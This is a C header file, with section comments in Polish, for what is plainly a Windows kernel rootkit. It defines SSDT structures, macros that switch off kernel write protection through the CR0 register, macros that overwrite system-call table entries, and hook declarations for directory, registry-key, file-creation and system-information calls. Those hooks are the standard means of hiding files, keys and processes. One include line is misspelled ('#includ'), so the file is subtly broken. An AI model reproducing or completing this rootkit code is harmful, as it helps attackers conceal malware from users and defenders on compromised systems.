#ifndef _H_RK_HOOK_
#define _H_RK_HOOK_

//---------------------------------------------------------------------------------
// TYPY
//---------------------------------------------------------------------------------

#includ <ntddk.h>

typedef     NTSTATUS    (NTAPI *NTPROC) ();

typedef     NTPROC      *PNTPROC;

#define     NTPROC_     sizeof(NTPROC)

typedef enum _SYSTEM_INFORMATION_CLASS
{
  SystemBasicInformation = 0,
  SystemProcessorInformation,
  SystemTimeZoneInformation,
  SystemTimeInformationInformation,
  SystemUnk4Information, 
  SystemProcessesInformation,
  SystemUnk6Information,
  SystemConfigurationInformation,
  SystemUnk8Information,
  SystemUnk9Information,
  SystemUnk10Information,
  SystemDriversInformation,
  SystemLoadImageInformation = 26,
  SystemUnloadImageInformation = 27,
  SystemLoadAndCallImageInformation = 38
} SYSTEM_INFORMATION_CLASS;

//RealNtCreateFile
typedef NTSTATUS (*NTCREATEFILE)(
  PHANDLE FileHandle,
  ACCESS_MASK DesiredAccess,
  POBJECT_ATTRIBUTES ObjectAttributes,
  PIO_STATUS_BLOCK IoStatusBlock,
  PLARGE_INTEGER AllocationSize,
  ULONG FileAttributes,
  ULONG ShareAccess,
  ULONG CreateDisposition,
  ULONG CreateOptions,
  PVOID EaBuffer,
  ULONG EaLength
);

typedef NTSTATUS (*NTQUERYSYSTEMINFORMATION)(
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    IN OUT PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength OPTIONAL
    );


typedef NTSTATUS (*NTQUERYDIRECTORYFILE)(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID FileInformationBuffer,
	IN ULONG FileInformationBufferLength,
	IN FILE_INFORMATION_CLASS FileInfoClass,
	IN BOOLEAN bReturnOnlyOneEntry,
	IN PUNICODE_STRING PathMask OPTIONAL,
	IN BOOLEAN bRestartQuery
);

typedef NTSTATUS (*ZWENUMERATEKEY)( 	
	IN HANDLE, 
	IN ULONG,
    IN KEY_INFORMATION_CLASS,
    OUT PVOID, 
	IN ULONG, 
	OUT PULONG 
);

typedef NTSTATUS (*ZWOPENKEY)( 	
	IN PHANDLE, 
	IN OUT ACCESS_MASK, 
	IN POBJECT_ATTRIBUTES 
);

typedef NTSTATUS (*ZWQUERYKEY)( 								  
	IN HANDLE, 
	IN KEY_INFORMATION_CLASS,
    OUT PVOID, 
	IN ULONG, 
	OUT PULONG 
);

//---------------------------------------------------------------------------------
// STRUKTURY
//---------------------------------------------------------------------------------

//
// Structure used in dynamicly obtaining NtAPIs indexes;
//

typedef struct {
	ULONG		NtCreateFileIndex;	
	ULONG		NtQueryDirectoryFileIndex;
} API_INDEXES, *PAPI_INDEXES;


typedef     struct tag_SYSTEM_SERVICE_TABLE     {
                    PNTPROC     ServiceTable;       // array of entry points
                    PULONG      CounterTable;       // array of usage counters
                    ULONG       ServiceLimit;       // number of table entries
                    PCHAR       ArgumentTable;      // array of argument counts 
}   SYSTEM_SERVICE_TABLE, *PSYSTEM_SERVICE_TABLE, **PPSYSTEM_SERVICE_TABLE;

// structure of a Service Descriptor Table. (KeServiceDescriptorTable
// and the unexported KeServiceDescriptorTableShadow).  
// (used in _TestDrv2)
typedef     struct  tag_SERVICE_DESCRIPTOR_TABLE    {
                    SYSTEM_SERVICE_TABLE    ntoskrnl;   // main native API table
                    SYSTEM_SERVICE_TABLE    win32k;     // win subsystem, in shadow table
                    SYSTEM_SERVICE_TABLE    sst3;       // could be posix subsys...
                    SYSTEM_SERVICE_TABLE    sst4;       // could be OS2 subsys...
}   SERVICE_DESCRIPTOR_TABLE, *PSERVICE_DESCRIPTOR_TABLE, **PPSERVICE_DESCRIPTOR_TABLE;


// [UDWS] import SDT pointer - KeServiceDescriptorTable is exported from ntoskrnl.exe,
// though undocumented...
extern      PSERVICE_DESCRIPTOR_TABLE   KeServiceDescriptorTable;

//
// Definition for system call service table
//
typedef struct _SRVTABLE {
	PVOID	*ServiceTable;
	ULONG	LowCall;        
	ULONG	HiCall;
	PVOID	*ArgTable;
} SRVTABLE, *PSRVTABLE;

//
// internall use structures 
//
typedef struct _MODULE_INFO {
	ULONG	d_Reserved1;
	ULONG	d_Reserved2;
	PVOID	p_Base;	
	ULONG	d_Size;
	ULONG	d_Flags;
	SHORT	w_Index;
	SHORT	w_Rank;
	SHORT	w_LoadCount;
	SHORT	w_NameOffset;
	UCHAR	a_bPath[MAXIMUM_FILENAME_LENGTH];
} MODULE_INFO, *PMODULE_INFO, **PPMODULE_INFO;

typedef struct _MODULE_LIST {
	ULONG	d_modules;
	MODULE_INFO	a_moduleInfo[];
} MODULE_LIST, *PMODULE_LIST, **PPMODULE_LIST;


#define    SystemModuleInformation    11

typedef struct _SYSTEM_MODULE_INFORMATION {//Information Class 11
    ULONG    Reserved[2];
    PVOID    Base;
    ULONG    Size;
    ULONG    Flags;
    USHORT    Index;
    USHORT    Unknown;
    USHORT    LoadCount;
    USHORT    ModuleNameOffset;
    CHAR    ImageName[256];
}SYSTEM_MODULE_INFORMATION,*PSYSTEM_MODULE_INFORMATION;

typedef struct _FILETIME { // ft 
    ULONG dwLowDateTime; 
    ULONG dwHighDateTime; 
} FILETIME; 

typedef struct _DirEntry {
  ULONG dwLenToNext;
  ULONG dwAttr;
// 08h
  FILETIME ftCreate, ftLastAccess, ftLastWrite;
// 20h
  ULONG dwUnknown[ 2 ];
  ULONG dwFileSizeLow;
  ULONG dwFileSizeHigh;
// 30h
  ULONG dwUnknown2[ 3 ];
// 3ch
  USHORT wNameLen;
  USHORT wUnknown;
// 40h
  ULONG dwUnknown3;
// 44h
  USHORT wShortNameLen;
  WCHAR swShortName[ 12 ];
// 5eh
  WCHAR suName[ 1 ];
} DirEntry, *PDirEntry;

//
// Key query structures
//

//---------------------------------------------------------------------------------
// MAKRA
//---------------------------------------------------------------------------------
//
// Makra włączające/wyłączające ochrone zapisu do załadowanego NTOSKRNL.EXE
//
#define WPOFF() \
	_asm mov eax, cr0 \
	_asm and eax, NOT 10000H \
	_asm mov cr0, eax

#define WPON() \
	_asm mov eax, cr0 \
	_asm or eax, 10000H \
	_asm mov cr0, eax


//
//	Macro for hooking SD table
//
#define SYSCALL(_index)  ((PSRVTABLE) KeServiceDescriptorTable)->ServiceTable[ _index ]

//
// Handy macro for syscal hooking by function address (not index in ssdt)
//

#define SYSTEMSERVICE(_function)  ((PSRVTABLE)KeServiceDescriptorTable)->ServiceTable[ *(PULONG)((PUCHAR)_function+1)]


//---------------------------------------------------------------------------------
// DEKLARACJE FUNKCJI
//---------------------------------------------------------------------------------

NTSTATUS HookNtQueryDirectoryFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID FileInformationBuffer,
	IN ULONG FileInformationBufferLength,
	IN FILE_INFORMATION_CLASS FileInfoClass,
	IN BOOLEAN bReturnOnlyOneEntry,
	IN PUNICODE_STRING PathMask OPTIONAL,
	IN BOOLEAN bRestartQuery
);

NTSTATUS 
  HookNtEnumerateKey(
    IN HANDLE  KeyHandle,
    IN ULONG  Index,
    IN KEY_INFORMATION_CLASS  KeyInformationClass,
    OUT PVOID  KeyInformation,
    IN ULONG  Length,
    OUT PULONG  ResultLength
    );

NTSTATUS 
HookZwOpenKey(
	PHANDLE phKey,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes
    );

NTSTATUS HookNtCreateFile(
  PHANDLE FileHandle,
  ACCESS_MASK DesiredAccess,
  POBJECT_ATTRIBUTES ObjectAttributes,
  PIO_STATUS_BLOCK IoStatusBlock,
  PLARGE_INTEGER AllocationSize,
  ULONG FileAttributes,
  ULONG ShareAccess,
  ULONG CreateDisposition,
  ULONG CreateOptions,
  PVOID EaBuffer,
  ULONG EaLength
);

NTSTATUS
HookNtQuerySystemInformation(
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    IN OUT PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength OPTIONAL
    );
    

NTSTATUS HookNtQueryKey(
	HANDLE hKey,
	KEY_INFORMATION_CLASS KeyInfoClass,
	PVOID KeyInfoBuffer,
	ULONG KeyInfoBufferLength,
	PULONG Byte
);
    
VOID HookNativeApi();                                   
VOID UnHookNativeApi();                             
BOOLEAN CheckIfMasterProcess( PEPROCESS eproc );

//---------------------------------------------------------------------------------
// IMPORTY FUNKCJI I ZMIENNYCH
//---------------------------------------------------------------------------------

__declspec(dllimport) ULONG NtBuildNumber;

NTSYSAPI
NTSTATUS
NTAPI
NtQuerySystemInformation(
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    IN OUT PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength OPTIONAL
    );

NTSYSAPI
NTSTATUS
NTAPI
NtDeviceIoControlFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	IN ULONG DeviceIoControlCode,
	IN PVOID InBuffer OPTIONAL,
	IN ULONG InBufferLength,
	OUT PVOID OutBuffer OPTIONAL,
	IN ULONG OutBufferLength
);

NTSYSAPI
NTSTATUS
NTAPI
ZwEnumerateKey(
	IN HANDLE hKey,
	IN ULONG Index,
	IN KEY_INFORMATION_CLASS  KeyInfoClass,
	OUT PVOID KeyInfoBuffer,
	IN ULONG KeyInfoBufferLength,
	OUT PULONG BytesCopied
);

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryKey(
	IN HANDLE hKey,
	IN KEY_INFORMATION_CLASS KeyInfoClass,
	OUT PVOID KeyInfoBuffer,
	IN ULONG KeyInfoBufferLength,
	OUT PULONG BytesCopied
);

#endif
